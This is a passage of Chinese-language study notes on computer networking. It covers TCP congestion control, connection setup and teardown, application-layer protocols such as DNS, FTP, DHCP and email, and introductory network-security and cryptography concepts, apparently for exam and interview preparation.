<img src="assets/1574688178264.png" alt="1574688178264" style="zoom:50%;" />

###### (4) 快恢复算法

根据上图所示。当发送端收到连续**三个重复的确认**时，由于发送方现在认为网络**很可能==没有==发生拥塞**，因此现在**不需要**执行慢开始算法，而是执行**快恢复算法** FR (Fast Recovery) 算法：

**（1）慢开始门限 ssthresh = 当前拥塞窗口 cwnd / 2 ；**
**（2）新拥塞窗口 cwnd = 慢开始门限 ssthresh ；**
**（3）开始执行拥塞避免算法，使拥塞窗口缓慢地线性增大。** 

<img src="assets/1574688469456.png" alt="1574688469456" style="zoom:40%;" />

##### 4. AIMD

**拥塞避免算法**中，**拥塞窗口**是按照**线性规律**增大的。这常称为“**加法增大**” AI (Additive Increase)。当出现超时或 3 个**重复的确认**时，就要把**门限值**设置为当前拥塞窗口值的**一半**，并大大减小拥塞窗口的数值这常称为“**乘法减小**”MD (Multiplicative Decrease)。二者合在一起就是所谓的 **AIMD** 算法。



#### TCP建立连接

TCP 是**面向连接**的协议。TCP 传输数据有三个阶段：**连接建立**、**数据传送**、**连接释放**。TCP 连接的管理就是使 TCP 连接的**建立和释放**都能正常地进行。

##### 1. 连接过程

TCP 连接建立过程中要解决的三个问题：

- 要使每一方能够确知**对方的存在**。
- 要允许双方**协商一些参数**（如最大窗口值、是否使用窗口扩大选项和时间戳选项以及服务质量等）。
- 能够对运输实体**资源**（如缓存大小、连接表中的项目等）进行**分配**。

TCP 建立连接的过程叫做**握手**。握手需要在客户和服务器之间**交换三个 TCP 报文段**。称之为**三报文握手**。流程如下：

<img src="assets/1574741516560.png" alt="1574741516560" style="zoom:38%;" />

**第一次握手**：客户端发送连接请求，**SYN** 是**同步号**，**seq** 是数据的第一个**字节序号**，连接请求也有**数据**，只不过数据字节数**为 1**。TCP 连接是只有**客户端才能发起**。

**第二次握手**：服务器**收到**连接请求，**SYN 也为 1**。并使 **ACK = 1**，表示收到客户端的连接请求。只有当 **ACK = 1** 时**确认号 ack 字段才有效**。所以必须设置 ACK = 1。由于服务器收到客户端发送的序号 **seq = x**，说明服务器收到这一个字节的数据，因此期待客户端下一个发送的数据的第一个字节是 seq = **x + 1**。所以确认号 **ack = x + 1**。同时服务器也设置一个自己的序号 **seq = y**。

这里要注意**区分 ACK**（**标志位**，**为 1 时 ack 才有效**， ACK 表示回复对方**已经收到**对方的消息） 与 **ack**（**确认号**，用于确认已经收到数据，并且回复下一个期待收到的数据）。

**第三次握手**：客户端收到服务器的第二次握手，需要对服务器进行第三次握手，此时客户端回复 **ACK = 1**，表示收到服务端的第二次握手信息。由于之前客户端发送的是序列号 **seq = x**。而且服务端也发回来的确认号也是 x + 1。因此如果是正常的握手报文则客户端第三次握手的数据报文就是 **seq = x + 1**。同时客户端也收到服务器的 **seq = y**，需要确认收到了这个，因此回复给服务器的确认中确认号变为 **ack = y + 1**。

此时完成三次握手。之后进行数据传输。

简化一点（**面试用**）：相当于客户端和服务端**都给**对方发送了 **SYN 和 ACK** 信号。

<img src="assets/image-20200522173211093.png" alt="image-20200522173211093" style="zoom: 45%;" />

##### 2. 三次握手的原因

> **为什么要进行第三次？只握手两次不行？**

**原因 1：三次握手最主要的目的就是双方确认自己与对方的发送与接收是正常的。**

- 第一次握手：Client 什么都不能确认；Server 确认了对方发送正常，自己接收正常。

- 第二次握手：Client 确认了：自己发送、接收正常，对方发送、接收正常；Server 确认了：对方发送正常，自己接收正常。

- 第三次握手：Client 确认了：自己发送、接收正常，对方发送、接收正常；Server 确认了：自己发送、接收正常，对方发送、接收正常。

三次握手是为了确定客户端与服务端都能**正常收发**。

**原因 2：进行第三次握手是为了防止失效的连接请求到达服务器，让服务器错误再次打开连接，占用服务器资源。**

客户端发送的连接请求如果在网络中==**滞留**==，那么就会隔很长一段时间才能收到服务器端发回的**连接确认**。客户端等待一个==**超时重传**==时间之后，就会**重新请求连接**。但是这个滞留的连接请求最后还是会到达服务器，如果不进行三次握手，那么服务器就会**打开两个连接**。如果有第三次握手，客户端会**忽略服务**器之后发送的对滞留连接请求的连接确认（因为序号这些对应不上），不进行第三次握手，因此就不会再次打开连接。

> **为什么要传回SYN**

服务端传回发送端所发送的 **SYN 是为了告诉发送端**它接收到的信息确实就是客户端所发送的信号。SYN 是 TCP/IP 建立**连接时**使用的**握手信号**。在客户机和服务器之间建立正常的 TCP 网络连接时，客户机首先发出一个 **SYN 消息**，服务器使用 **SYN-ACK 应答**表示**接收到了这个消息**，最后客户机**再以 ACK **消息响应。这样在客户机和服务器之间才能建立起可靠的 TCP 连接，数据才可以在客户机和服务器之间传递。



#### TCP释放连接

TCP 连接释放过程比较复杂，与连接不同，数据传输结束后，通信的双方**都可**释放连接。TCP 连接释放过程是**四报文握手**。

##### 1. **释放过程**

通俗的例子：A 和 B 打电话，通话即将结束后，A 说“我没啥要说的了”（第一次），B回答“我知道了”（第二次），但是 B 可能还会有要说的话，A 不能要求 B 跟着自己的节奏结束通话，于是 B 可能又巴拉巴拉说了一通，最后 B 说“我说完了”（第三次），A 回答“知道了”（第四次），这样通话才算结束。

这里假设客户端**主动**释放连接。释放连接过程如下：

<img src="assets/1574741905218.png" alt="1574741905218" style="zoom:60%;" />

**第一次挥手**：客户端发送 **FIN = 1**。并且其数据部分序号为 **seq = u**（仅一个字节数据）。 

**第二次挥手**：服务器收到**释放连接**的请求，那么**直接**回复 **ACK = 1**，表示**确认收到**客户端的释放请求。同时回复其确认号 **ack = u + 1**（即服务端期望客户端发送的下一个字节）。

同时：如果服务端还有未发送完成的数据，此时服务端可以**继续**发送给客户端，直到数据发送完成（注意此时只能服务端给客户端发送数据，也就是主动发起释放连接的一方只能接受**不能再发送**了）。

**第三次挥手**：服务器数据发送完成之后发送另一个**释放消息**，即 **FIN = 1**，同时 **ACK = 1**，表示收到客户端的消息，此时 ack 有效，且 ack = **u + 1** 。同时服务端设置自己的序列号 seq = w。

**第四次挥手**：客户端收到服务器的释放报文后，需要**再次确认**。此时 **ACK = 1**（确认信息有效），同时 **seq = u + 1**（客户端前一次发送 u 的基础上加 1），ack = **w + 1**（表明收到服务器的 seq = w 的信息）。**四次挥手完成**。

四次挥手流程简化版（面试用）：相当于客户端和服务端**都给**对方发送了 **FIN 和 ACK** 信息，只不过服务端的 分成了两次，所以变成了四次挥手。

<img src="assets/image-20200522173824538.png" alt="image-20200522173824538" style="zoom:45%;" />

> **四次挥手的原因**

客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 **CLOSE-WAIT** 状态。这个状态是为了**让服务器端发送还未传送完毕的数据**，传送完毕之后，服务器**会发送 FIN 连接释放**报文。

> **面试常问 Time_wait 与 Close_wait。**

##### 2. TIME_WAIT

四次挥手之后之后**客户端**进入 **Time-Wait 状态**，等待 **==2MSL==** 的时间。**MSL** 中文可以译为“**==报文最大生存时间==**”，它是任何报文在网络上**存在的最长时间**，超过这个时间报文将被**丢弃**。一般时间长度是 30 秒。等待 2MSL 时间主要**目的**是**怕最后一个 ACK** 包对方**没收到**，那么对方在**超时后将重发第三次握手的 FIN 包**，主动关闭端接到**重发的 FIN 包后可以再发一个 ACK 应答包**，从而确保四次挥手完成。在 TIME_WAIT 状态时**两端的端口不能使用**，要等到 2MSL 时间结束**才可继续使用**。当连接处于 2MSL 等待阶段时任何迟到的报文段都将被**丢弃**。

**客户端**接收到服务器端的 **FIN 报文**后进入此状态，此时**并不是直接进入 CLOSED** 状态，还需要等待一个**时间计时器**设置的时间 **2MSL**。这么做有两个理由：

- 确保**最后一个确认报文**能够到达。如果 **B 没收到** A 发送来的**确认报文**，那么就会**重新发送连接释放**请求报文，A 等待一段时间就是为了处理这种情况的发生。
- 等待一段时间是为了让本连接持续时间内所产生的**所有报文都从网络中消失**，使得下一个新的连接**不会出现旧的连接**请求报文。

##### 3. TCP连接状态总结

- **CLOSED**：初始状态。
- **LISTEN**：服务器处于监听状态。
- **SYN_SEND**：客户端 socket 执行 CONNECT 连接，发送 SYN 包，进入此状态。
- **SYN_RECV**：服务端收到 SYN 包并发送服务端 SYN 包，进入此状态。
- **ESTABLISH**：表示**连接建立**。客户端发送了最后一个 ACK 包后进入此状态，服务端接收到 ACK 包后进入此状态。
- **FIN_WAIT_1**：终止连接的一方（通常是客户机）发送了 FIN 报文后进入。**等待对方 FIN**。
- **CLOSE_WAIT**：（假设服务器）接收到客户机 FIN 包之后等待关闭的阶段。在接收到对方的 FIN 包之后，自然是需要立即回复 ACK 包的，表示已经知道断开请求。但是本方是否立即断开连接（发送 FIN 包）取决于是否还有数据需要发送给客户端，若有，则在发送 FIN 包之前均为此状态。
- **FIN_WAIT_2**：此时是半连接状态，即有一方要求关闭连接，等待另一方关闭。客户端接收到服务器的 ACK 包，但并没有立即接收到服务端的 FIN 包，进入 FIN_WAIT_2 状态。
- **LAST_ACK**：服务端发动最后的 FIN 包，等待最后的客户端 ACK 响应，进入此状态。
- **TIME_WAIT**：客户端收到服务端的 FIN 包，并立即发出 ACK 包做最后的确认，在此之后的 2MSL 时间称为 TIME_WAIT 状态。

##### 4. 其他

###### (1) 保活计时器

用来防止在 TCP 连接出现**长时期的空闲**，比如客户端**直接断电**，来不及发送释放的报文。**保活计时器** 通常设置为 **2 小时** 。若服务器过了 2 小时**还没有收到**客户的信息，它就发送**探测报文段**。若发送了 10 个探测报文段（每一个相隔 75 秒）还没有响应，就假定客户出了故障，就主动**终止该连接**。

###### (2) TCP有限状态机

箭头旁边的字，表明引起这种变迁的原因，或表明发生状态变迁后又出现什么动作。

图中有三种不同的箭头。

- 粗实线箭头表示对客户进程的正常变迁。
- 粗虚线箭头表示对服务器进程的正常变迁。
- 细线箭头表示异常变迁。 

<img src="assets/1574742398806.png" alt="1574742398806" style="zoom:56%;" />



#### TCP协议保证可靠传输总结

总结一下 TCP 协议是如何保证传输可靠的？？答案就是：**==ARQ 协议 + 滑动窗口协议==**。

1. **数据编号**：应用数据被分割成 TCP 认为最适合发送的**数据块**。TCP 给发送的每一个**数据包进行编号**，接收方对数据包进行排序，把有序数据传送给应用层。
2. **校验和：** TCP 将保持它首部和数据的**检验和**。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。
3. **ARQ 协议：** 也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。TCP 的接收端会**丢弃重复**的数据。
4. **超时重传：** 当 TCP 发出一个**报文**后，它启动一个**定时器**，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将**重发**这个报文段。
5. **流量控制：** TCP 连接的每一方都有固定大小的缓冲空间，TCP的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议。 （TCP 利用滑动窗口实现流量控制）
6. **拥塞控制：** 当网络拥塞时，减少数据的发送。



#### 面试题

##### 1. TCP连接中如果断电怎么办？

当 TCP 两端 A、B 建立了连接后，如果一端拔掉网线或者**拔掉电源**，那么另一端能够收到通知吗？**答案是不会**。

TCP 是一种**有连接**的协议，但是这个连接并不是指有一条实际的电路，而是一种**虚拟的电路**。TCP 的建立连接和断开连接都是通过**发送数据**实现的，也就是常说的三次握手、四次挥手。TCP 两端保存了一种**数据的状态**，就代表这种连接，TCP 两端之间的路由设备只是将数据转发到目的地，并不知道这些数据实际代表了什么含义，也并没有在其中保存任何的状态信息，也就是说中间的路由设备没有什么连接的概念，只是将数据转发到目的地，只有数据的发送者和接受者两端真正的知道传输的数据代表着一条连接。

但是这就说明了一点，如果**不发送数据**那么是**无法断开连接**的。正常情况下当 TCP 的一端 A 调用了 SOCKET 的 close 或者进程结束，操作系统就会按照 TCP 协议发送 FIN 数据报文。B 端收到后就会**断开连接**。但是当出现了上述的异常情况时：**被拔掉网线或者断掉电源**，总结起来就是**没有机会发出断开的 FIN 数据报文**。那么和 A 直连的路由设备虽然知道 A 设备已经断开了，但是路由设备并没有保存连接的状态信息，所以路由设备也就不可能去通知 B 端 A 端的断开。而 B 端没有收到断开的数据报文就会**依然保持连接**。**所以 A 端拔掉网线或者断掉电源后 B 端是没办法收到断开连接的通知的**。
**保持连接**并不是毫无代价的，如果这种异常断开的连接有很多，那么势必会耗费大量的资源，必须要想办法**检测出这种异常连接**。
检测的方法很简单，只要让 B 端主动通过这个连接向 A 端**继续发送数据**即可。上文说过，A 端异常断开后，和 A 端直接连接的路由器是知道的。当 B 端发送的数据经过转发后到达这个路由器后，必然最终会返回 B 端一个目的不可达。此时 B 端立刻就会知道这条连接其实已经异常断开了。
但是 B 端不可能知道什么时候会出现这种异常，所以 B 端必须**定时发送数据来检测连接是否异常断开**。数据的内容无关紧要，任何数据都能达到这个效果。这个数据就是经常在 TCP 编程中所说的**心跳**。

**KEEP_ALIVE**：**TCP 协议本身就提供了一种这样的机制来探测对端的存活**。TCP 协议有一个 KEEP_LIVE 开关，只要打开这个开关就会定时发送一些数据**长度为零**的探测心跳包，发送的频率和次数都可以设置。

**应用层心跳**：除了使用 TCP 协议本身的保活开关机制，还可以在**应用层主动发送心跳数据包**，那么在应用层主动发送心跳数据包的方式和 TCP 协议本身的保活机制有什么区别呢？应用层的心跳数据包会耗费更多的带宽，因为 TCP 协议的保活机制发送的是**数据长度为零的心跳包**，而应用层的心跳数据包长度则必然会大于 0。应用层的心跳数据包可以带一些应用所需要的数据，随应用自己控制，而 TCP 协议的保活机制则是对于应用层透明的，无法利用心跳携带数据。
**双向心跳**：那么是否只是一端向另一端发送心跳就行了呢？显然不行。因为两端都有可能发生异常断开的情况。所以 TCP 连接的**两端必须都向对端发送心跳**。

- 参考资料：https://blog.csdn.net/bjrxyz/article/details/71076442

##### 2. 流量控制和拥塞控制的区别？

- **拥塞控制**所要做的都有一个前提，就是网络能够承受现有的**网络负荷**。
- **拥塞控制**是一个**全局性的过程**，涉及到所有的主机、所有的路由器，以及与降低网络传输性能有关的所有因素。
- **流量控制**往往指在给定的发送端和接收端之间的**点对点**通信量的控制。流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收。 

- **流量控制**属于通信**双方协商**；**拥塞控制**涉及**通信链路全局**。

- 流量控制需要通信双方各维护一个发送窗、一个接收窗，对任意一方，接收窗大小由自身决定，发送窗大小由接收方响应的TCP报文段中窗口值确定；拥塞控制的拥塞窗口大小变化由试探性发送一定数据量数据探查网络状况后而自适应调整。

- **发送方实际最终发送窗口 = min{流控发送窗口，拥塞窗口}。**



### 应用层

#### 概述

每个应用层协议都是为了解决**某一类应用问题**，而问题的解决又往往是通过位于不同主机中的多个应用进程之间的通信和协同工作来完成的。应用层的具体内容就是规定应用进程在通信时所遵循的协议。

应用层的许多协议都是基于客户端服务器方式，客户端(client) 和服务器 (server) 都是指通信中所涉及的两个应用进程。客户服务器方式所描述的是进程之间服务和被服务的关系。客户是服务请求方，服务器是服务提供方。

##### 1. 应用层协议概述

|       应用       | 应用层协议 |  端口号   | 传输层协议  |             备注             |
| :--------------: | :--------: | :-------: | :---------: | :--------------------------: |
|   **域名解析**   |  **DNS**   |  **53**   | **UDP/TCP** | 长度超过 512 字节时使用 TCP  |
| 动态主机配置协议 |  **DHCP**  |   67/68   |   **UDP**   |                              |
| 简单网络管理协议 |    SNMP    |  161/162  |     UDP     |                              |
|   文件传送协议   |  **FTP**   | **20/21** |   **TCP**   | **控制连接 21，数据连接 20** |
|   远程终端协议   |   TELNET   |  **23**   |     TCP     |                              |
|  超文本传送协议  |  **HTTP**  |  **80**   |   **TCP**   |                              |
| 简单邮件传送协议 |    SMTP    |    25     |   **TCP**   |                              |
|   邮件读取协议   |    POP3    |    110    |   **TCP**   |                              |
| 网际报文存取协议 |    IMAP    |    143    |   **TCP**   |                              |



#### 域名系统DNS

##### 1. 概述

许多应用层软件经常直接使用**域名系统 DNS** (**Domain Name System**)，但计算机的用户只是间接而不是直接使用域名系统。

域名到 IP 地址的解析是由**若干个域名服务器**程序完成的。域名服务器程序在**专设的结点**上运行，运行该程序的机器称为**域名服务器（DNS 服务器）**。 

##### 2. 域名结构

互联网采用**层次结构的命名树**作为主机的名字，并使用**分布式的域名系统 DNS**。任何一个连接在互联网上的主机或路由器，都有一个唯一的层次结构的名字，即**域名**。域名的结构由**标号序列**组成，各标号之间用点隔开（注意顶级域名在最后）：

```
….三级域名.二级域名.顶级域名
```

各标号分别代表不同**级别**的域名。 

**顶级域名TLD（Top Level Domain）**

- 国家顶级域名 nTLD，例如：.cn 表示中国 ；.us 表示美国

- 通用顶级域名 gTLD。

- 最早的顶级域名是：.com（公司和企业）；.org（非赢利性组织）；.edu（美国专用的教育机构）；.int（国际组织）

**互联网的域名空间**

<img src="assets/1574744063308.png" alt="1574744063308" style="zoom:35%;" />

##### 3. 域名服务器

一个 DNS 服务器所负责管辖的（或有权限的）范围（单位）叫做**区 (zone)**。各单位根据具体情况来划分自己管辖范围的区，但在一个区中的所有节点必须是能够连通的。每一个区设置相应的**权限域名服务器**，用来保存该区中的所有主机的域名到 IP 地址的映射。区的不同划分举例

<img src="assets/1574744129385.png" alt="1574744129385" style="zoom:50%;" />

**树状**结构的 **DNS 域名服务器**。

<img src="assets/1574744170402.png" alt="1574744170402" style="zoom:35%;" />

**权限域名服务器**：负责一个**区**的域名服务器。当一个权限域名服务器还不能给出最后的查询回答时，就会告诉发出查询请求的 DNS 客户，**下一步应当找哪一个权限域名服务器**。 

**本地域名服务器**：本地域名服务器对域名系统非常重要。当一个**主机**发出 DNS 查询请求时，这个查询请求报文就**发送给==本地域名服务器==**。每一个互联网服务提供者 ISP，或一个**大学**，甚至一个大学里的系，都可以拥有一个本地域名服务器，这种域名服务器有时也称为**默认域名服务器**。

##### 4. 域名解析过程

**主机向==本地域名服务器==的查询一般都是采用==递归查询==**。如果主机所询问的**本地域名服务器不知道**被查询域名的 IP 地址，那么本地域名服务器就以 **DNS 客户的身份**，向其他**根域名服务器**继续发出查询请求报文。

<img src="assets/1574744409073.png" alt="1574744409073" style="zoom:50%;" />

每个域名服务器都维护一个**高速缓存**，存放最近用过的名字以及从何处获得**名字映射信息**的记录。可大大减轻根域名服务器的负荷，使互联网上的 DNS 查询请求和回答报文的数量大为减少，缓存应该设置合理的过期时间。

##### 5. DNS的传输协议

DNS 可以使用 **UDP 或者 TCP** 进行传输，使用的端口号都为 **53**。**大多数情况下 DNS 使用 ==UDP== 进行传输**。那 TCP 是可靠的，UDP 不可靠。DNS 应该是**可靠**的，但它使用 UDP，**为什么？**

- UDP 速度**更快**。TCP 很慢，因为它需要 3 次握手。DNS 服务器上的**负载**也是一个重要因素。DNS 服务器（因为它们使用 UDP）没有保持连接。
- DNS 请求通常非常小，非常适合 UDP 段。
- UDP 不可靠，但可以在**应用层添加可靠性**。应用程序可以使用 UDP，并且可以通过在**应用程序层使用超时和重新发送**来实现可靠性。

在两种情况下会使用 **TCP** 进行传输：

- 如果返回的响应超过的 **512 字节**（UDP 最大只支持 512 字节的数据）。
- 区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。



#### 文件传送协议FTP

##### 1. FTP特点

文件传送协议 FTP 只提供文件传送的一些**基本**的服务，它使用 **TCP** 可靠的运输服务。FTP 的主要功能是减少或消除在不同操作系统下处理文件的**不兼容**性。

FTP 使用客户服务器方式。一个 FTP 服务器进程可同时为多个客户进程提供服务。FTP 的服务器进程由两大部分组成：一个**主进程**，负责接受新的请求；另外有**若干个从属进程**，负责处理单个请求。

##### 2. **主进程工作步骤**

- 打开熟知端口（端口号为 **21**），使客户进程能够连接上。
- **等待**客户进程发出连接请求。
- 启动**从属进程**来处理客户进程发来的请求。从属进程对客户进程的请求处理完毕后即终止，但从属进程在运行期间根据需要还可能创建其他一些子进程。
- 回到**等待**状态，继续接受其他客户进程发来的请求。主进程与从属进程的处理是并发地进行。 

##### 3. **两个TCP连接**

- **==控制连接==**在整个会话期间**一直保持打开**，FTP 客户发出的传送请求通过控制连接发送给服务器端的控制进程，但控制连接**不用**来传送文件。当客户进程向服务器进程发出建立**连接请求**时，要寻找连接服务器进程的**熟知端口 (21)**，同时还要告诉服务器进程自己的另一个端口号码，用于建立数据传送连接。
- **==数据连接==**用于实际传输文件。服务器端的控制进程在接收到 FTP 客户发送来的文件传输请求后就创建“**数据传送进程”和“数据连接”**，用来连接客户端和服务器端的数据传送进程。服务器进程用自己**传送数据**的**熟知端口 (20)** 与客户进程所提供的端口号码建立数据传送连接。数据传送进程实际完成文件的传送，在传送完毕后关闭“数据传送连接”并结束运行。两个连接如下图所示。

<img src="assets/1574744894796.png" alt="1574744894796" style="zoom:50%;" />

##### 4. **两种模式**

根据数据连接是否是**服务器端主动建立**，FTP 有主动和被动两种模式：

- **主动模式**：服务器端主动建立数据连接，其中服务器端的端口号为 **20**，客户端的端口号随机，但是必须大于 1024，因为 0\~1023 是熟知端口号。

- **被动模式**：客户端主动建立数据连接，其中客户端的端口号由客户端自己指定，服务器端的端口号随机。

**主动模式**要求客户端**开放端口号**给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是**被动模式**会导致服务器端的**安全性减弱**，因为开放了过多的端口号。

##### 5. **TFTP**

TFTP (Trivial File Transfer Protocol) 是一个很小且易于实现的文件传送协议，其端口号码为  69。TFTP 使用客户服务器方式和使用 UDP 数据报，因此 TFTP 需要有自己的差错改正措施。TFTP 只支持文件传输而不支持交互。TFTP 没有一个庞大的命令集，没有列目录的功能，也不能对用户进行身份鉴别。 TFTP 很像停止等待协议。



#### 动态主机配置协议DHCP

##### 1. 概述

在协议软件中，给**协议参数赋值的动作叫做协议配置**。一个协议软件在使用之前必须是已正确配置的。连接到互联网的计算机的协议软件需要配置的**参数**包括：IP 地址、子网掩码、默认路由器的 IP 地址、域名服务器的 IP 地址等。

这些信息通常存储在一个**配置文件**中，计算机在引导过程中可以对这个文件进行存取。 

**DHCP** (Dynamic Host Configuration Protocol) 提供了**即插即用的连网方式**，用户不再需要手动配置 IP 地址等信息。这种机制允许一台计算机加入新的网络和获取 IP 地址，而不用手工配置。DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。

##### 2. 工作流程

DHCP **工作过程**如下：

需要 IP 地址的主机在启动时就向 DHCP 服务器**广播**发送**发现报文**（**DHCPDISCOVER**），这时该主机就成为 DHCP 客户。本地网络上**所有主机**都能收到此广播报文，但只有 **DHCP 服务器才回答**此广播报文。如下图所示。

<img src="assets/1574747537971.png" alt="1574747537971" style="zoom:50%;" />

DHCP 服务器先在其数据库中查找该计算机的**配置信息**。若找到，则返回找到的信息。若找不到，则从服务器的 IP 地址池 (address pool) 中取一个地址分配给该计算机。DHCP服务器的回答报文叫做**提供报文（DHCPOFFER）**，DHCP 服务器返回信息是以**单播方式**进行，如下图所示。 

<img src="assets/1574747556884.png" alt="1574747556884" style="zoom:50%;" />

DHCP 基于 **UDP** 工作，DHCP **服务器**运行在 67 号端口， DHCP **客户**运行在 68 号端口。

具体流程见下图：

1. DHCP 服务器被动打开 UDP 端口 67， 等待客户端发来的报文。

2. 客户端发送 **Discover** 报文，该报文的目的地址为 **255.255.255.255:67**，源地址为 **0.0.0.0 : 68**，被放入 UDP 中，该报文被广播到同一个子网的所有**主机**上。如果客户端和 **DHCP 服务器**不在同一个子网，就需要使用中继代理。

3. DHCP 服务器收到 Discover 报文之后，发送 **Offer 报文**给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到**多个 DHCP 服务器**提供的信息，因此客户端需要进行**选择**。

4. 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 **Request 报文**给该 DHCP 服务器。

5. 被选择的 DHCP 服务器发送确认报文 DHCPACK，进入已绑定状态，并可**开始使用**得到的临时 IP 地址了。

    DHCP 客户现在要根据服务器提供的租用期 T 设置两个计时器 T1 和 T2，它们的超时时间分别是 0.5T 和 0.875T。当超时时间到就要请求更新租用期。

6. 租用期过了一半（T1 时间到），DHCP 发送请求报文 DHCPREQUEST，要求更新租用期。 

7. DHCP 服务器若同意，则发回确认报文 DHCPACK。DHCP 客户得到了新的租用期，重新设置计时器。

8. DHCP 服务器若不同意，则发回否认报 DHCPNACK。这时 DHCP 客户必须立即停止使用原来的 IP 地址，      而必须重新申请 IP 地址（回到步骤  2）。若 DHCP 服务器不响应步骤  6 的请求报文 DHCPREQUEST，则在租用期过了 87.5% 时，DHCP 客户必须重新发送请求报文 DHCPREQUEST（重复步骤  6），然后又继续后面的步骤。 

9. DHCP 客户可随时提前终止服务器所提供的租用期，这时只需向 DHCP 服务器发送释放报文 DHCPRELEASE 即可。

![1574747793582](assets/1574747793582.png)



#### 远程登录协议

**TELNET** 用于登录到远程主机上，并且远程主机上的输出也会返回。TELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。



#### 电子邮件协议

一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件协议。邮件协议包含发送协议和读取协议，发送协议常用 **SMTP**，读取协议常用 **POP3 和 IMAP**。这几个协议都是**基于 TCP** 的。

<img src="assets/1574746525846.png" alt="1574746525846" style="zoom:50%;" />

##### 1. SMTP

**SMTP** 基于 **TCP** 实现客户与服务器之间的通信。

<img src="assets/1574746552293.png" alt="1574746552293" style="zoom:40%;" />

SMTP 只能发送 **ASCII 码**，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主体的结构，定义了非 ASCII 码的编码规则。

<img src="assets/1563548733556.png" alt="1563548733556" style="zoom:75%;" />

##### 2. POP3

POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。

##### 3. IMAP

IMAP 协议中客户端和服务器上的邮件保持同步，如果不手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。



#### 应用进程跨越网络的通信

##### 1. 系统调用和应用编程接口

大多数操作系统使用**系统调用** (system call ) 的机制在应用程序和操作系统之间传递控制权。对程序员来说，每一个系统调用和一般程序设计中的函数调用非常相似，只是系统调用是将控制权传递给了**操作系统**。

<img src="assets/1574749293150.png" alt="1574749293150" style="zoom:45%;" />

**系统调用接口**实际上就是应用进程的控制权和操作系统的控制权进行转换的一个接口。使用系统调用之前要编写一些程序，特别是需要设置系统调用中的许多参数，因此这种系统调用接口又称为应用编程接口 API (Application Programming Interface) 。

**套接字的作用**

- 当应用进程需要使用网络进行通信时就发出**系统调用**，请求操作系统为其创建“**套接字**”，以便把网络通信所需要的系统资源分配给该应用进程。
- 操作系统为这些资源的总和用一个叫做**套接字描述符**的号码来表示。
- 应用进程所进行的**网络操作**都必须使用这个套接字描述符。
- 通信完毕后，应用进程通过一个关闭套接字的系统调用通知操作系统回收与该套接字描述符相关的所有资源。

<img src="assets/1574749387278.png" alt="1574749387278" style="zoom:50%;" />

##### 2. 几种常用的系统调用

当应用进程需要使用网络进行通信时，就发出系统调用。使用 TCP/IP 应用编程接口 API，就可以编写基于互联网的网络应用程序了。调用 API 时，用户可以使用 TCP 服务，也可以使用 UDP 等其他服务。系统调用使用顺序的例子（里面包含一些常用的系统调用）

<img src="assets/1574749479515.png" alt="1574749479515" style="zoom:45%;" />







### 网络安全

#### 网络安全问题概述

##### 1. 网络攻击

计算机网络上的通信面临以下两大类威胁：**被动攻击和主动攻击**。

**被动攻击**：指攻击者从网络上**窃听**他人的通信内容，通常把这类攻击称为**截获**。在被动攻击中，攻击者只是观察和分析某一个协议数据单元 PDU，以便了解所交换的数据的某种性质。但不干扰信息流。这种被动攻击又称为流量分析 (traffic analysis)。

<img src="assets/1574750667503.png" alt="1574750667503" style="zoom:40%;" />

**主动攻击**主要有：

- **篡改**：故意篡改网络上传送的报文。这种攻击方式有时也称为更改报文流。
- **恶意程序**：种类繁多，对网络安全威胁较大的主要包括：计算机病毒、计算机蠕虫、特洛伊木马、逻辑炸弹、后门入侵、流氓软件等。
- **拒绝服务** **DoS**：指攻击者向互联网上的某个服务器不停地发送大量分组，使该服务器无法提供正常服务，甚至完全瘫痪。若从互联网上的成百上千的网站集中攻击一个网站，则称为分布式拒绝服务 DDoS。

##### 2. **数据加密模型**

**加密和解密**用的**密钥K** (key) 是一串秘密的字符串（即比特串）。明文通过加密算法 E  和加密密钥 K  变成密文。接收端利用解密算法 D 运算和解密密钥 K  解出明文 X。解密算法是加密算法的**逆运算**。加密密钥和解密密钥可以一样，也可以**不一样**。当密钥需要向远地传送时，一定要通过另一个安全信道。

<img src="assets/1574751118107.png" alt="1574751118107" style="zoom:45%;" />



#### 两类密码体制

##### 1. 对称密钥密码体制

###### (1) 概述

所谓常规密钥密码体制，即**加密密钥与解密密钥是相同的密码体制**，这种加密系统又称为**对称密钥**系统。

<img src="assets/1574751456904.png" alt="1574751456904" style="zoom: 45%;" />

数据加密标准 DES 属于**对称密钥密码体制**，是一种**分组密码**。在加密前，先对整个明文进行分组。每一个组长为 64 位。然后对每一个 64 位 二进制数据进行加密处理，产生一组 64 位密文数据。最后将各组密文串接起来，即得出整个的密文。使用的密钥为 64 位（**实际密钥长度为 56 位**，有 8 位用于奇偶校验)。 DES 的**保密性仅取决于对密钥的保密**，其**算法是公开**的。目前较为严重的问题是 DES 的密钥的长度。现在已经设计出搜索 DES 密钥的专用芯片。56 位 **DES 已不再认为是安全**的了。 

###### (2) 三重DES

使用两个 56 位的密钥。把一个 64 位明文用一个密钥加密，再用另一个密钥解密，然后再使用第一个密钥加密。

<img src="assets/1574751638039.png" alt="1574751638039" style="zoom:40%;" />

##### 2. 公钥密码体制

###### (1) 概述

公钥密码体制（又称为**公开密钥密码**体制）使用**不同的加密密钥与解密密钥**，是一种“由已知加密密钥推导出解密密钥在计算上是不可行的”密码体制。 

